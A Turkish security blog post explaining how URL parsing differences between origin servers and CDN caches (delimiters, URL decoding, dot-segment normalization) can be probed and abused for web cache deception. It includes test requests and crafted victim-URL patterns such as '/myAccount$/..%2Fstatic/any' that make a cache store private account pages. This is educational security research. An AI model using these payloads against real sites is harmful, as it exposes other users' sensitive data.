---
sitemap: true
layout: b-post
title:  "Web Cache Poisoning için Kuralları Esnetmek"
modified:
author: Taylan Özgür Bildik
tags: [web, güvenlik]
categories: blog 
cover: 
permalink: /:title
toc: true
---


Buradaki yazıyı ele alarak açıklama gayretinde olacağım. Fakat mevcut yazı içerisinde çoğu durumda Türkçe yerine pek çok kavramın İngilizce şekilde kullanıldığını belirtmem gerek. İleri okumalarda ve genel araştırmalarda kavramlar her daim İngilizce olacağı için bu yaklaşımı tercih ediyorum. 

# URL Tutarsızlıkları

Cache kurallarını ve hangi endpoint üzerinde işlem yapılıp hangi kaynağa ulaşılmak istenildiği saptayabilmek için kaynak(origin) sunucusunun, yapılan isteğin kesin yolunu(absolute path) hesaplaması gerekiyor. Bunun için URL adresi, delimiter(sınırlayıcı karakter) ve normalizasyon ile ayrıştırılıyor(parsing).

Eğer URL adresini; cache ve uygulama sunucusu farklı şekilde parse ederse, bu tutarsızlık URL’nin anlamını değiştirerek hangi yanıtların tutulduğunu ve bunlara ulaşmak için hangi cache key’lerinin kullanıldığını kontrol etmemizi sağlayabilir.

## Delimiters

Popüler olan pek çok framework ve HTTP sunucusu, "sınırlayıcı" karakter yani “delimiter” olarak farklı karakterleri kullanabiliyorlar(URL RFC dokümanları bu konuda serbestlik sunduğu için). Bu durum da, uygulama(kaynak-origin) sunucusu ile önbellekteki ayrıştırıcı arasında path adresi karışıklığına neden olabilir.

### Origin delimiters

Uygulama sunucuları ve frameworkler üzerinde kullanılan delimiter karakterlerine örnekler:



- **Noktalı virgül:** Pek çok Java frameworklerinde olduğu gibi Spring üzerinde de noktalı virgül `;` karakteri **sınırlayıcı** olarak kabul edilir. URL’de yer aldığında mutlak yolun(absolute path) parçası olarak yorumlanmaz.
    
    **URL:** <span class="mavi">/MyAccount<span class="kirmizi">;</span>var1=val</span> → **Path:** <span class="mavi">/MyAccount</span>
    
    **URL:** <span class="mavi">/hello<span class="kirmizi">;var=a</span>/world<span class="kirmizi">;var1=b;var2=c</span></span> → **Path:** <span class="mavi">/hello/world</span>

---
    
- **Nokta:** Ruby on Rails üzerinde nokta karakteri sınırlayıcı olarak kullanılabiliyor.
    
    **URL:** <span class="mavi">/MyAccount<span class="kirmizi">.html</span></span> → **Path:** <span class="mavi">/MyAccount</span> (default HTML view)
    
    **URL:** <span class="mavi">/MyAccount<span class="kirmizi">.css</span></span> → **Path:** <span class="mavi">/MyAccount</span> (CSS view or error if not present)
    
    **URL:** <span class="mavi">/MyAccount<span class="kirmizi">.aaaa</span></span> → **Path:** <span class="mavi">/MyAccount</span> (default HTML view)


---
    
- **Null encoded byte:** OpenLiteSpeed HTTP sunucusu null encoded byte karakterini delimiter olarak kabul edip yol buradan itibaren kısaltıyor.

    **URL:** <span class="mavi">/MyAccount<span class="kirmizi">%00aaa</span></span> → **Path:** <span class="mavi">/MyAccount</span>


---
    
- **Newline encoded byte:** Nginx istek yolunu yeniden yazacak(rewrite the request path) şekilde yapılandırıldığında, kodlanmış yeni satır baytı(encoded newline byte) delimiter olarak kullanılır. Yeniden yazma kuralı, yol adının tamamını değil (Nginx'te yaygın olan) öneki veya URL'yi eşlemelidir.
    
    **Rule:** <span class="mavi">rewrite /user/(.*) /account/$1 break;</span>
    
    **URL:** <span class="mavi">/users/MyAccount<span class="kirmizi">%0aaaa</span></span> → **Path:** <span class="mavi">/account/MyAccount</span>

    

### Origin delimiters keşfi

Origin yani hedefteki sunucu tarafında sınırlayıcı(delimiter) karakterin hangisi olduğunu keşfetmek için aşağıdaki gibi basit bir yol izlenebilir:

**1-** Önbelleğe alınmayan bir istek bulun. Yani **POST** gibi idempotent olmayan bir http metoduna sahip bir istek veya `Cache-Control: no-store` veya `Cache-Control: private` başlığına sahip bir yanıt bulmanız gerek.  Bu ilk isteğe **R0** yani **Request 0** diyelim. Bu istek sayesinde testler sırasında URL içindeki farklı karakterlerin nasıl ele aldığını anlayabileceğimiz standart bir referans noktamız olacak. 

<p class="mavi"><strong>ℹ️ Not:</strong> HTTP idempotent, aynı isteğin birden fazla kez yapılmasının aynı sonucu doğurmasını ifade eder; yani, isteğin tekrarı yan etkiler yaratmadan aynı yanıtı verir. Örneğin <code class="language-plaintext highlighter-rouge">POST</code> <code class="language-plaintext highlighter-rouge">PUT</code> <code class="language-plaintext highlighter-rouge">DELETE</code> http metotları <strong>idempotent değillerdir.</strong></p>

**2-** Aynı isteği, dizin adresinin sonuna rastgele karakterler ekleyerek tekrar gönderin. Örneğin test ettiğiniz dizin **/home** ise **/homeasdf** şeklinde olmayan bir adrese istek atın. Eğer bu istek yani R1 isteği, ilk istek(R0) ile aynı ise bu işlemi farklı endpointler üzerinde tekrar tekrar deneyin. Bu durum adres dizininin kontrol edilmediğine işaret ettiği için hangi noktalarda bu durumun geçerli olduğunu keşfedin. Ayrıştırma işleminin nasıl gerçekleştirildiğini anlayabilmemiz için, dizini kontrol eden bir nokta üzerinde testimize devam etmemiz gerek.

**3-** R1’deki isteği potansiyel sınırlayıcı(delimiter) olduğunu düşündüğünüz karakterlerle birlikte tekrar gönderin. Yani örneğin **/home** dizinini test edeceğiniz sınırlayıcı karakter **$** işareti ise **/home$abcd** şeklinde rastgele bir istek gönderin. R2 çıktısını R0 ile kıyasladığınızda aynı ise, bu **$** karakterinin delimiter yani sınırlayıcı karakter olarak kullanıldığını teyit edebilirsiniz. 

Ayrıca tek seferde birden fazla delimiter karakteri test etmek için burp intruder ya da basit bir script yazıp kullanabilirsiniz. ASCII karakterlerinin de bulunduğu standart ve URL encode edilmiş karakterlerin hepsini test etmeniz gerek. Aşağıdaki wordlist bu konuda yardımcı olabilir:

[Ascii-delimiter-wordlist.txt]({{ site.url }}/blog/payloads/ascii-delimiter-wordlist.txt){:target="_blank"}

### Cache delimiter keşfi

Önbellek sunucuları sıklıkla `?` işareti dışında delimiter karakteri kullanmazlar. Yine de önbellek mekanizması tarafından kabul edilen sınırlayıcı karakteri bulmak için aşağıdaki yaklaşım kullanılabilir:

**1-** Yanıt zamanı, veya `X-Cache: hit` gibi ipuçlarından yola çıkarak, isteğimizin önbelleğe alındığı bir nokta bulalım. Bu sayede isteğimizin önbellek mekanizması tarafından işlendiğinden kesin olarak emin olabileceğiz. Bu ilk yani R0 isteğine verilen yanıtı, daha sonraki istekleri karşılaştırırken standart referans noktası olarak kullanacağız.

**2-** Aynı isteği bu kez aşağıdaki gibi olası delimiter karakteri ve rastgele bir veri ile birlikte tekrar gönderin.

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">GET</span> <span class="o">/</span><span class="kd">static</span><span class="o">-</span><span class="nx">endpoint</span><span class="o">&lt;</span><span class="nx text-danger">DELIMITER</span><span class="o">&gt;</span><span class="p">&lt;</span><span class="nc text-success">Random</span><span class="p">&gt;</span>
</code></pre></div></div>

Eğer bu istek ilk istek ile aynı ise, girdiğiniz delimiter karakteri önbellek mekanizması tarafında kullanılıyordur. 

Örneğin `$`’nin sınırlayıcı olarak kullanıldığı durumda aşağıdaki isteklerin hepsi önbellek mekanizması için aynı kabul edilir.

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">GET</span> <span class="o">/</span><span class="nx">anasayfa</span>
<span class="nx">GET</span> <span class="o">/</span><span class="nx">anasayfa<span class="text-danger">$</span><span class="text-success">asdf</span></span>
<span class="nx">GET</span> <span class="o">/</span><span class="nx">anasayfa<span class="text-success"><span class="text-danger">$</span>deneme<span class="text-danger">$</span>metni</span></span>
</code></pre></div></div>

Çünkü sınırlayıcı karakter olan `$` karakterinden sonraki değerler sınır dışı kabul edilip yok sayılır:

**URL:**  <span class="mavi">/anasayfa</span> → **Path:** <span class="mavi">/anasayfa</span> 

**URL:**  <span class="mavi">/anasayfa<span class="kirmizi">$asdf</span></span>  → **Path:** <span class="mavi">/anasayfa</span> 

**URL:**  <span class="mavi">/anasayfa<span class="kirmizi">$deneme$metni</span></span>  → **Path:** <span class="mavi">/anasayfa</span> 

## Normalization

URL ayrıştırma işlemi hem sunucu hem de cache tarafında çeşitli nedenlerle(hedef endpoint tespiti, cache key üretimi veya doğrulanması vb.) uygulanıyor. Öncelikle, pathname yani yol adının başlangıcını ve sonunu bulmak için path delimiters(yol sınırlayıcılar) tanımlanır. Path adresi elde edildikten sonra varsa karakter kodları(URL encode gibi) çözülür(örn: **%61** → **a**) ve noktalar(`../../` gibi) kaldırılır. Sonuçta normalleştirme işlemiyle bu girdi normalize edilmiş olur. Şimdi bu normalleştirme adımları üzerinde biraz daha duralım:

## Encodings

Bazen HTTP ayrıştırıcısı yerine uygulama tarafında ayrıştırma yapılması için delimiter karakterinin korunması gerekir. Bunun için de URL encode edilerek delimiter karakterinin değişmeden uygulama tarafına iletilmesini sağlanır.

Nginx, Node, CloudFlare, CloudFront ve Google Cloud da dahil çoğu HTTP sunucusu ve proxy, path yolunu yorumlamadan önce belirli delimiter karakterlerinin decode edilmesini sağlar. İşin kötüsü bu işlem standart değildir. Bu, herhangi bir özel yapılandırma olmasa bile aynı URL'nin en popüler CDN'lerde ve hedef uygulama sunucularında farklı bir anlama sahip olacağı anlamına gelir.

Çünkü RFC standartı, bir isteğin nasıl iletilmesi veya yeniden yazılması gerektiğini konusunda kesinlik belirtmez. Birçok proxy, URL'i decode eder ve bu decode edilmiş mesajı iletir. Böyle bir durum meydana gelirse, bir sonraki ayrıştırıcı da decode edilen karakterleri sınırlayıcı olarak kullanabilir. Yani örneğin bu durumda aşağıdaki istek proxy tarafından alınırsa `%3F` karakteri soru işareti sembolüne dönüştürülecektir.

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="dl">"</span><span class="s2">/myAccount<span class="text-danger">%3F</span>param</span><span class="dl">"</span> <span class="err">→</span> <span class="dl">"</span><span class="s2">/myAccount<span class="text-danger">?</span>param</span><span class="dl">"</span>
</code></pre></div></div>

Ayrıca farklı cache proxy servisleri üzerinde "*URL encoding*" dışında diğer encoding türlerinin desteklendiğini de görebilirsiniz. Örneğin Cloudflare ya da Cloudfrount üzerinde özel dönüşümler için konfigürasyonları düzenlemek mümkündür.

## Decoding Davranışlarının Tespiti

Girilen verilerin decode işlemine tabi tutulup tutulmadığını test etmek için aşağıdaki gibi standart bir isteğin encode edilmiş versiyonu üzerinden deneme yapabilirsiniz:

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr"><span class="text-danger">/</span>home<span class="text-danger">/</span>i</span><span class="nx">ndex</span> <span class="err">→</span> <span class="o"><span class="text-danger">/</span>%</span><span class="mi">68</span><span class="o">%</span><span class="mi">6</span><span class="nx">f</span><span class="o">%</span><span class="mi">6</span><span class="nx">d</span><span class="o">%</span><span class="mi">65</span><span class="text-danger"><span class="o">%</span><span class="mi">2</span><span class="nx">f</span></span><span class="o">%</span><span class="mi">69</span><span class="o">%</span><span class="mi">6</span><span class="nx">e</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">78</span>
</code></pre></div></div>

**Not:** Bazen belirli karakterler decode edilemediğinden(eğik çizgi `/` veya diğer özel karakterler gibi) her karakteri ayrı ayrı encode etmek faydalı olabilir.

Eğer önbellek tutmayan bir noktada test gerçekleştiriyorsanız ve aldığınız yanıt encode edilmemiş standart yanıt ile aynı ise, hedef sunucunun bu path adresini kullanmadan önce decode işlemi yaptığı anlamına gelir. 

İlk standart istek ve yanıtı:

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/<span class="text-danger">egitim</span></span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">linuxdersleri.net</span>

HTTP/2 301 Moved Permanently
Location: https://www.linuxdersleri.net/<span class="text-danger">egitim</span>
Cache-Control: no-store

&lt;html&gt;
&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;
&lt;/html&gt;
</code></pre></div></div>

URL encode edilmiş ikinci istek ve yanıtı:

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">GET</span> <span class="o">/<span class="text-danger">%65%67%69%74%69%6d</span></span> <span class="nx">HTTP</span><span class="o">/</span><span class="mi">2</span>
<span class="nx">Host</span><span class="p">:</span> <span class="nx">linuxdersleri</span><span class="p">.</span><span class="nx">net</span>

<span class="nx">HTTP</span><span class="o">/</span><span class="mi">2</span> <span class="mi">301</span> <span class="nx">Moved</span> <span class="nx">Permanently</span>
<span class="nx">Location</span><span class="p">:</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//www.linuxdersleri.net/<span class="text-danger">egitim</span></span>
<span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="p">:</span> <span class="nx">no</span><span class="o">-</span><span class="nx">store</span>

<span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;&lt;</span><span class="nt">title</span><span class="p">&gt;</span>301 Moved Permanently<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="err">/</span><span class="na">html</span><span class="p">&gt;</span>
</code></pre></div></div>

Yukarıdaki iki örnek istek, önbelleğe alınmayan yanıtlar sayesinde sunucunun encode edilmiş verileri işlemeden önce decode ettiğini bize kanıtlamış oldu.

### Cache Mekanizmasında Test

Eğer önbelleğe alınan bir nokta üzerinde test gerçekleştiriyorsanız, ilk olarak path adresinin cache key olarak kullanılıp kullanılmadığından emin olun. Daha sonra standart path ile istek gönderin. Sonrasında ise bu path adresini encode şekilde tekrar gönderin. Eğer standart path ile encode halindeki path için üretilen yanıtta aynı cache başlıklarını görüyorsanız yani aynı yanıtı alıyorsanız; bu durum ikinci yanıtın cache proxy’den alındığı ve encode haldeki path yolunun cache key kıyaslaması yapılmadan önce decode edildiği anlamına gelir.

Örneğin aşağıdaki isteği iki kez gönderdiğimde **/kurs** adresinin önbelleğe alındığına dair `X-Cache: Hit` başlığını yanıtta görebiliyorum.

İlk olarak standart şekilde **/kurs** adresine iki kez istek atılıyor:

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">GET</span> <span class="o">/</span><span class="nx text-primary">kurs</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mi">2</span>
<span class="nx">Host</span><span class="p">:</span> <span class="nx">linuxdersleri</span><span class="p">.</span><span class="nx">net</span>

<span class="nx">HTTP</span><span class="o">/</span><span class="mi">2</span> <span class="mi">301</span> <span class="nx">Moved</span> <span class="nx">Permanently</span>
<span class="nx">Location</span><span class="p">:</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//www.linuxdersleri.net/<span class="text-primary">kurs</span></span>
<span class="nx">X</span><span class="o">-</span><span class="nx">Served</span><span class="o">-</span><span class="nx">By</span><span class="p">:</span> <span class="nx">cache</span><span class="o">-</span><span class="nx">sof1510025</span><span class="o">-</span><span class="nx">SOF</span>
<span class="nx">X</span><span class="o">-</span><span class="nx">Cache</span><span class="p">:</span> <span class="nx text-danger">MISS</span>
</code></pre></div></div>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">GET</span> <span class="o">/</span><span class="nx text-primary">kurs</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mi">2</span>
<span class="nx">Host</span><span class="p">:</span> <span class="nx">linuxdersleri</span><span class="p">.</span><span class="nx">net</span>

<span class="nx">HTTP</span><span class="o">/</span><span class="mi">2</span> <span class="mi">301</span> <span class="nx">Moved</span> <span class="nx">Permanently</span>
<span class="nx">Location</span><span class="p">:</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//www.linuxdersleri.net/<span class="text-primary">kurs</span></span>
<span class="nx">Via</span><span class="p">:</span> <span class="mf">1.1</span> <span class="nx">varnish</span>
<span class="nx">Age</span><span class="p">:</span> <span class="mi">210</span>
<span class="nx">X</span><span class="o">-</span><span class="nx">Served</span><span class="o">-</span><span class="nx">By</span><span class="p">:</span> <span class="nx">cache</span><span class="o">-</span><span class="nx">sof1510025</span><span class="o">-</span><span class="nx">SOF</span>
<span class="nx">X</span><span class="o">-</span><span class="nx">Cache</span><span class="p">:</span> <span class="nx text-success">HIT</span>
<span class="nx">X</span><span class="o">-</span><span class="nx">Cache</span><span class="o">-</span><span class="nx">Hits</span><span class="p">:</span> <span class="mi">2</span>
</code></pre></div></div>

**/kurs** path adresinin önbelleğe alındığını `X-Cache: HIT` başlığı sayesinde görmüş olduk. 

Şimdi **/kurs** ifadesini URL encode şekilde yani **/%6b%75%72%73** şeklinde tekrar gönderip, cache mekanizmasının tepkisine bakalım.

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">GET</span> <span class="o">/<span class="text-primary">%%6b%75%72%73</span></span> <span class="nx">HTTP</span><span class="o">/</span><span class="mi">2</span>
<span class="nx">Host</span><span class="p">:</span> <span class="nx">linuxdersleri</span><span class="p">.</span><span class="nx">net</span>

<span class="nx">HTTP</span><span class="o">/</span><span class="mi">2</span> <span class="mi">301</span> <span class="nx">Moved</span> <span class="nx">Permanently</span>
<span class="nx">Location</span><span class="p">:</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//www.linuxdersleri.net/<span class="text-primary">kurs</span></span>
<span class="nx">Via</span><span class="p">:</span> <span class="mf">1.1</span> <span class="nx">varnish</span>
<span class="nx">Age</span><span class="p">:</span> <span class="mi">177</span>
<span class="nx">X</span><span class="o">-</span><span class="nx">Served</span><span class="o">-</span><span class="nx">By</span><span class="p">:</span> <span class="nx">cache</span><span class="o">-</span><span class="nx">sof1510033</span><span class="o">-</span><span class="nx">SOF</span>
<span class="nx">X</span><span class="o">-</span><span class="nx">Cache</span><span class="p">:</span> <span class="nx text-success">HIT</span>
<span class="nx">X</span><span class="o">-</span><span class="nx">Cache</span><span class="o">-</span><span class="nx">Hits</span><span class="p">:</span> <span class="mi">2</span>
</code></pre></div></div>

Bakın benim test ettiğim noktada, cache mekanizması key kıyaslaması yapmadan önce decode işlemi uyguladığı için **/kurs** ve **/%6b%75%72%73** aynı kabul edilip önbellekten yanıt döndürüldü.

Böylelikle hedef üzerinde, "decode" etme davranışları hakkında görü sahibi olabiliriz. 

## Nokta Normalizasyonu

RFC standartı, göreli yol belirtmek gibi durumlar için yani ***/../home*** gibi URL adresleri için, URL üzerinde bulunan noktaların nasıl ele alınması gerektiği konusunda bir algoritma çözümü sunmuştur. Fakat bu çözüm aslında birçok güvenlik açığının da kaynağıdır. 

Önbellek kurallarının davranışlarını değiştirmek ve isteğimize göre cache key elde etmek için nokta işaretinin ele alınışından kaynaklanan ayrıştırma tutarsızlıklarından yararlanabiliriz. Apache ve Nginx gibi popüler HTTP sunucuları bile URL'leri tamamen farklı şekilde ele alır; bu durum da path confusion açığı olmadan aynı önbellek proxy'sini kullanmanın imkansız olduğu anlamına gelir.

### Nokta Normalizasyonun Tespiti

Hem hedef sunucu hem de cache mekanizması üzerinde test etmek için benzer yaklaşım kullanılabilir.

Hedef sunucu üzerindeki normalizasyonu görmek için önbelleğe alınmayan bir nokta üzerinde veya önbelleğe alınıyorsa önbellek bozucu bir parametre ile aynı isteği dizin değiştirme(path traversal) yükü ile gönderin.

Önbelleğe alınmayan standart istek:

```jsx
GET /home/index?cacheBuster
```
Önbelleğe alınmayan, path traversal işareti bulunan istekler:

```jsx
GET /aaa/../home/index?cacheBuster 
```

ya da

```jsx
GET /aaa\..\home/index?cacheBuster
```

Eğer path üzerinde bu nokta işaretleri(`/../` ya da `\..\`) normalize ediliyorsa buradaki tüm istekler aslında **/home/index?cacheBuster** adresine dönüştürülecektir.

### Hedef Sunucuda Test

Önbellek bulunmayan endpoint'e isteklerimizi atarak, hedef sunucunun nokta(`/../` ya da `\..\`) karakterlerine normalleştirme uygulama durumunu test edelim:

```jsx
GET /test HTTP/2
Host: linuxdersleri.net

HTTP/2 301 Moved Permanently
Location: https://www.linuxdersleri.net/test
Cache-Control: no-store
```

```jsx
GET /deneme/../test HTTP/2
Host: linuxdersleri.net

HTTP/2 301 Moved Permanently
Location: https://www.linuxdersleri.net/test
Cache-Control: no-store
```

```jsx
GET /deneme\..\test HTTP/2
Host: linuxdersleri.net

HTTP/2 301 Moved Permanently
Location: https://www.linuxdersleri.net/test
Cache-Control: no-store
```

Yanıtlar aynıysa bu, path adresindeki noktaların sunucu tarafında bir kaynakla eşlenmeden önce normalleştirildiği anlamına gelir. Bu normalleştirme, hedef sunucuda veya aradaki bir proxy tarafından istek iletilmeden önce gerçekleşebilir. Her iki durumda da nokta bölümü çözümlenir ve mevcut bir kaynağa referans vermek için kullanılabilir.

### Cache Mekanizmasında Test

Cache mekanizması üzerindeki durumu test etmek için, önbelleğe alındığından emin olduğunuz bir endpoint üzerinede aynı şekilde path traversal karakterler(`/../` ya da `\..\`) ile aynı kaynaklara ulaşıp ulaşamadığınıza bakarak bu karakterlerin normalize edilip edilmediğini anlayabilirsiniz.

Öncelikle önbelleğe alındığından emin olduğumuz bir endpoint'e istek atalım:

```jsx
GET /test HTTP/2
Host: linuxdersleri.net

HTTP/2 301 Moved Permanently
Location: https://www.linuxdersleri.net/test
X-Cache: HIT
```

Şimdi path traversal ile aynı noktaya işaret edecek şekilde isteğimizi atalım:

```jsx
GET /deneme/../test HTTP/2
Host: linuxdersleri.net

HTTP/2 301 Moved Permanently
Location: https://www.linuxdersleri.net/test
X-Cache: MISS
```

Eğer cache mekanizması almış olduğu **/deneme/../test** path adresini normalize ediyor olsaydı **/test** haline dönüştürüp önceden önbelleğe aldığı yanıtı döndürecekti. Fakat buradaki örnekte cache mekanizması, path traversal karakterlerini normalize etmediğini `X-Cache: MISS` başlığı ile göstermiş oldu.

## Normalizasyon Tutarsızlıkları

Aşağıdaki tabloya bakarak  `/hello/..%2fworld` adresinin farklı HTTP sunucuları ve web cache proxy’leri üzerinde nasıl normalize edildiğini görebilirsiniz. 

![image.png]({{ site.url }}/blog/img/web-cache-poisoning-icin-kurallari-esnetmek/image.png){:class="responsive img-zoomable"}

[Resim kaynağı:](https://portswigger.net/research/gotta-cache-em-all){:target="_blank"}

HTTP sunucusu ve cache hizmeti üzerindeki bu tutarsızlıkların neden olabileceği zafiyet için [web cache deception](https://www.linuxdersleri.net/web-cache-deception){:target="_blank"} açıklarına göz atabilirsiniz. Bu konudan bahsederek devam edelim.

# Web Cache Deception

Önbellek mekanizması, sunucudan bir yanıt aldığında, bu yanıtın statik olup olmadığına yani saklanıp saklanmaması gerektiğine karar vermesi gerekiyor. Bu kararı da, daha önceden belirlenmiş olan isteğe bağlı özelleştirilebilir kurallar etkiler. Biz de bu bölümde, bir yanıtın önbelleğe alınıp alınmaması gerektiğini belirlemek için kullanılan URL kurallarına odaklanacağız. 

Kuralları emellerimize göre kötüye kullanarak; dinamik olan içeriklere erişmemiz yani aslında çoğunlukla diğer kullanıcılara özel olan hassas değişken verilere statik verilermişçesine önbellekten ulaşmamız mümkün olacak.

## Limitler

Oluşturduğumuz URL kurbanların tarayıcısı üzerinde kullanılacağı için, URL adresinde yer alan payloadlar yalnızca güvenli URL karakterlerini içermelidir. Çünkü tarayıcılar göndermeden önce encode işlemi yapmazlar. 

Kurbanın tarayıcısını, belirli karakterleri encode eden ve URL’deki bazı bölümleri kaldıran bir proxy gibi düşünün. Bu sayede buna uygun URL üretip kurbana göndermek gerektiğinin farkında olursunuz. Zira Burp gibi proxy araçları üzerinden gönderdiğiniz URL ile standart tarayıcılar üzerinden kurban tarafından kullanılanlar aynı olmayacak.

## Statik Uzantılılar

Cloudflare ve Akamai gibi CDN’lerin pek çoğu, statik uzantı olarak kabul ettikleri ***.js .css*** gibi uzantıları gördükleri bu yanıtları statik olarak kabul edip önbelleğe depolarlar. 

Her CDN servisinin hangi uzantıları statik olarak kabul edeceği görmek için bizzat servis dokümanlarına bakmanız yeterli. Örneğin Cloudflare aşağıdakileri statik olarak kabul ediyor:

![image.png]({{ site.url }}/blog/img/web-cache-poisoning-icin-kurallari-esnetmek/image%201.png){:class="responsive img-zoomable"}

[Resim kaynağı:](https://portswigger.net/research/gotta-cache-em-all#extensions)

## Statik Uzantıların Kötüye Kullanımı

Bir karakter hedef sunucu üzerinde delimiter olarak kabul edilip, cache mekanizması üzerinde kabul edilmediğinde bundan faydalanarak sunucu tarafındaki hassas verilerin cache üzerinde depolanmasını sağlayabiliriz.

Örneğin dolar işaretinin sunucu tarafında sınırlayıcı yani delimiter karakteri olarak kullanıldığını ama cache üzerinde delimiter olarak kabul edilmediğini varsayalım. Bu durumda kullanıcının hesap bilgilerini barındıran **/myAccount** adresindeki verilerin önbelleğe alınması için **/myAccount$static.css** isteğini göndermemiz yeterli.

![image.png]({{ site.url }}/blog/img/web-cache-poisoning-icin-kurallari-esnetmek/image%202.png){:class="responsive img-zoomable"}

Gördüğünüz gibi sonunda ***.css*** uzantısı olduğu ve cache mekanizması `$` işaretini delimiter olarak kabul etmediği için bu isteğe verilecek yanıt önbelleğe alınacak. Sunucu  tarafında ise `$` işareti delimiter olarak kabul edildiği için **/myAccount** adresindeki bilgiler önbellek mekanizmasına yanıt olarak gönderilecek. 

Ayrıca bu tekniği encode edilmiş karakter veya dize üzerinden de gerçekleştirebilirsiniz. Bu yaklaşım, hedef sunucunun URL parsing yani ayrıştırma yapmadan önce delimiter karakterlerini decode ettiği durumda ya da cache tarafından bu path yeniden yazılıp yönlendirildiğine kullanılabilir. Örneğin, encode edilmemiş hashtag `#` sembolü, tarayıcı tarafından gönderilmediğinden önbellek aldatması için işe yaramaz, ancak encode edilmişse istismar için kullanılabilir:

![image.png]({{ site.url }}/blog/img/web-cache-poisoning-icin-kurallari-esnetmek/image%203.png){:class="responsive img-zoomable"}

Hedefe uygun benzer yaklaşımları değiştirerek kullanabiliriz. Örneğin eğer aradaki proxy veya load balancer gibi yapılar decode işlemi uyguluyorsa çift encode işlemi ile aradaki yönlendirmeleri sorunsuz kılabiliriz.

![image.png]({{ site.url }}/blog/img/web-cache-poisoning-icin-kurallari-esnetmek/image%204.png){:class="responsive img-zoomable"}

## Statik Dizinler

Neredeyse tüm CDN hizmetlerinde, dizin altındaki tüm her şeyin önbelleğe alınması gerektiğini belirten statik dizinler tanımlanabiliyor. Bu dizinlere örnekler:

- /static
- /assets
- /wp-content
- /media
- /templates
- /public
- /shared

Bu sayede örneğin /static dizini altındaki tüm dizinlerdeki yanıtlar önbelleğe alınacak denilmiş oluyor.

### Statik Dizinleri Delimiter Sayesinde Kötüye Kullanmak

Eğer bir karakter hedef sunucu tarafından delimiter olarak kullanıyor ama cache mekanizmasında kullanılmıyorsa ve cache mekanizması path adresini statik dizin kuralından önce normalize ediyorsa, path traversal karakterlerini delimiter ardında gizleyebilirsiniz:

```jsx
GET /<Dynamic_Resource><Delimiter><Encoded_Dot_Segment><Static_Directory>
```

Burada path traversal için nokta bölümünü encode etmek önemli. Aksi halde kurbanın tarayıcısı bu url adresini bozacaktır.

![image.png]({{ site.url }}/blog/img/web-cache-poisoning-icin-kurallari-esnetmek/image%205.png){:class="responsive img-zoomable"}

Burada **/myAccount$/..%2Fstatic/any** isteğini kurban kendi tarayıcısında açtı. Bu url adresi aynen cache mekanizmasına iletildi. 

Cache mekanizması almış olduğu **/myAccount$/..%2Fstatic/any** URL adresini normalleştirerek sunucunun vereceği yanıtı **/static/any** adresinin önbelleği olarak tutmak üzere bekler.

Sunucu kendisine gelmiş olan **/myAccount$/..%2Fstatic/any** isteğini `$` delimiter karakteri sayesinde /myAccount olarak kabul eder. Bu adresteki hassas bilgileri önbelleğe yanıt olarak döndürür. 

Hedefteki cache mekanizmasının URL adreslerini nasıl ve ne koşulda normalize ettiğine göre yaklaşımlar değişiklik gösterebilir. Fakat ilgili çözümlerin dokümantasyonları sayesinde hangi yaklaşımın işe yarayabileceğini öngörebilirsiniz.

### Statik Dizinleri Normalizasyon Sayesinde Kötüye Kullanmak

Hedef sunucunun path adresini normalize edip cache mekanizmasının etmediği durumda, path traversal için nokta karakterlerini ekleyerek sunucu tarafında işlenmesini sağlayabiliriz.

```jsx
GET /<Static_Directory><Encoded_Dot_Segment><Dynamic_Resource>
```

![image.png]({{ site.url }}/blog/img/web-cache-poisoning-icin-kurallari-esnetmek/image%206.png){:class="responsive img-zoomable"}

Cloudflare, Google Cloud ve Fastly varsayılan olarak cache kuralını hesaplamadan önce path adresini normalize etmez. Eğer hedef sunucu Nginx, Microsoft ISS ve OpenListeSpeed gibi normalize ediyorsa buradaki saldırıyı gerçekleştirmek mümkün olabilir.

Microsoft IIS'yi ters slash `\` dönüştürmeyen herhangi bir web önbelleğiyle birleştirirken başka bir normalleştirme tutarsızlığı ortaya çıkar. Bu önbellekler encode şekildeki ters eğik çizgileri normal eğik çizgiler olarak yorumlar. Test edilen hiçbir CDN bu dönüşümü tanımadığından, IIS bu tür ürünlerle kullanıldığında saldırıya açıktır.

![image.png]({{ site.url }}/blog/img/web-cache-poisoning-icin-kurallari-esnetmek/image%207.png){:class="responsive img-zoomable"}

## Statik Dosyalar

*/robots.txt*, */favicon.ico* ve */index.html* gibi bazı dosyalar statik bir dizin içinde veya statik olarak kabul edilen bir uzantıda olmayabilirler. Fakat bunlar genellikle sık değişmedikleri için önbellekte tutulmaları için özel kural tanımlanmış olabilir. Bu amaçla, tam dosya yolu ve ismi ile eşleşenlerin önbelleğe alınması kuralı tanımlanmış olabilir. Örneğin CloudFlare gibi CDN'ler varsayılan olarak bu kurala sahiptir ve her zaman *robots.txt* veya *favicon.ico* yanıtlarını saklarlar.

